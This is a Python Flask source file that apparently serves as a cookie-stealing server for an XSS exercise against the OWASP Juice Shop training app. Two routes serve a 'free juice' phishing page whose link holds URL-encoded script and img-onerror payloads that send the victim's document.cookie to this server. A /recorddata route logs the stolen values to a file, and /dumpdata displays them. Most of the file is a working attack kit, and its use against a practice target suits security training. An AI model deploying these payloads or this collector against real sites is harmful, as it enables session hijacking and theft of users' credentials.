import os
import sys
from flask import Flask, request
from time import gmtime, strftime

app=Flask(__name__)

@app.route('/')
def hello():
    return 'This site is for testing purposes only!'


@app.route('/heartbeat')
def heartbeat():
    return "I am alive"

@app.route('/dumpdata')
def dumpdata():
    datafile = "/tmp/alldata.txt"
    if not os.path.isfile( datafile ):
        return "server contains no data :-("
    with open(datafile) as f:
        lines = f.readlines()
    data = '<html><BODY>'
    for line in lines:
        data = data + line + '</br>'
    data = data + '</BODY></html>'
    return data


@app.route('/recorddata')
def recorddata():
    data = request.query_string.decode('unicode-escape') + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
    file = open("/tmp/alldata.txt","a")
    file.write(data)
    file.close()
    return data


@app.route('/whoami')
def whoami():
    return request.url_root


@app.route('/oldfreejuice')
def oldfreejuice():
    xss='''<!DOCTYPE html> <html> <head> <style> body { background-color: #93B874; } h1 { background-color: orange; } </style> <title>Get a free juice!</title> </head> <body> <center> <h1>Winner!  Winner!</h1> <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''recorddata%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here</a> to claim!  </p> </center> </body> </html>
'''
    return xss


@app.route('/freejuice')
def freejuice():
    xss='''<!DOCTYPE html> <html> <head> <style> body { background-color: #93B874; } h1 { background-color: orange; } </style> <title>Get a free juice!</title> </head> <body> <center> <h1>Winner!  Winner!</h1> <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3Cimg+src%3Dx+onerror%3D%22javascript%3Avar+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+xmlHttp.open%28+%27GET%27%2C+%27''' + request.url_root + '''recorddata%3F%27%2Bdocument.cookie%2C+false+%29%3B+xmlHttp.send%28+null+%29%3B%22%3E">click here</a> to claim!  </p> </center> </body> </html>
'''
    return xss


if __name__=="__main__":
    app.run()





